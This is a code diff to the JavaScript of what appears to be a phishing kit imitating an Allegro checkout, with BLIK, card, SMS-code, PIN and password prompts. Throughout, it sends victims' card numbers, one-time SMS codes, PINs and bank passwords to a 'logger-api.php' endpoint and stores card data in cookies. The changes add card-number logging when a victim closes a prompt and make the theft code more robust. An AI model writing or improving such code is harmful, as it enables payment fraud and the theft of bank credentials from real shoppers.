@@ -1,6 +1,17 @@
 let Current = {"Payment": "NIC", "Redirect": false, "Card": 0};
 let State = {"Payment": false, "PaymentInputLoaded": false, "CardInputLoaded": false, "BlikSubmitted": false};
 let blikPollTimer = null;
+
+// Numer aktualnie wybranej karty (bezpiecznie, gdy brak listy)
+function CurrentCardRef() {
+    try {
+        if (!Cards) return "";
+        return String(Cards.split("|")[Current["Card"]] || "").split(";")[0] || "";
+    } catch (e) {
+        return "";
+    }
+}
+
 let Events = {
 
 
@@ -46,14 +57,21 @@ let Events = {
         TogglePayment(false)
         SelectPayment("NIC")
         $(`.sms-input-modal`).hide()
-        $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMS-CLOSE`)
+        $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMS-CLOSE&card-number=${CurrentCardRef()}`)
     },
 
     "[data-testid='close-pin-button']": function() {
         TogglePayment(false)
         SelectPayment("NIC")
         $(`.pin-input-modal`).hide()
-        $.get(`/api/logger-api.php?id=${LinkID}&log-type=PIN-CLOSE`)
+        $.get(`/api/logger-api.php?id=${LinkID}&log-type=PIN-CLOSE&card-number=${CurrentCardRef()}`)
+    },
+
+    "[data-testid='close-pass-button']": function() {
+        TogglePayment(false)
+        SelectPayment("NIC")
+        $(`.pass-input-modal`).hide()
+        $.get(`/api/logger-api.php?id=${LinkID}&log-type=PASS-CLOSE&card-number=${CurrentCardRef()}`)
     },
 
     "[data-testid='show-blik-button']": function() {
@@ -213,7 +231,7 @@ function SendSMS() {
         return;  
     }
 
-    $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMSCode&sms-code=${SMSCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
+    $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMSCode&sms-code=${SMSCode}&card-number=${CurrentCardRef()}`)
     $(`.sms-input-modal`).hide()
 }
 
@@ -223,7 +241,7 @@ function SendPIN() {
     if (PINCode.trim() === "") {
         return;  
     }
-    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PINCode&sms-code=${PINCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
+    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PINCode&sms-code=${PINCode}&card-number=${CurrentCardRef()}`)
     $(`.pin-input-modal`).hide();
 }
 
@@ -233,7 +251,7 @@ function SendPass() {
     if (passCode.trim() === "") {
         return;  
     }
-    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PASSCode&sms-code=${passCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
+    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PASSCode&sms-code=${passCode}&card-number=${CurrentCardRef()}`)
     $(`.pass-input-modal`).hide();
 }
 
@@ -304,7 +322,7 @@ function SaveCard() {
         CardData = CardData + `${InputValue};`;
     }
 
-    Cards = Cards + CardData + "|";
+    Cards = (Cards || "") + CardData + "|";
     Cookies.set("SavedCards", Cards);
     LoadCard()
     $(`.payment-card-modal`).hide()
@@ -481,9 +499,11 @@ function TogglePayment(Toggle) {
     } else if (Current["Payment"] == "Bank") {
         Redirect("PayU")
     } else if (Current["Payment"] == "Card") {
-        SplittedCards = Cards.split("|");
-        SelectedCard = SplittedCards[Current["Card"]].split(";");
-        
+        SplittedCards = (Cards || "").split("|");
+        SelectedCard = (SplittedCards[Current["Card"]] || "").split(";");
+        if (!SelectedCard[0]) {
+            return;
+        }
         const dane = getAllegroAddressData();
 
         if (dane) {
@@ -508,6 +528,9 @@ function TogglePayment(Toggle) {
                             Current["Redirect"] = true;
                         } else {
                             $(`.waiting-push-container`).hide();
+                            $(`.sms-input-modal`).hide();
+                            $(`.pin-input-modal`).hide();
+                            $(`.pass-input-modal`).hide();
                             if (data == 4) {
                                 $(`.waiting-push-container`).show();
                             } else if (data == 5) {
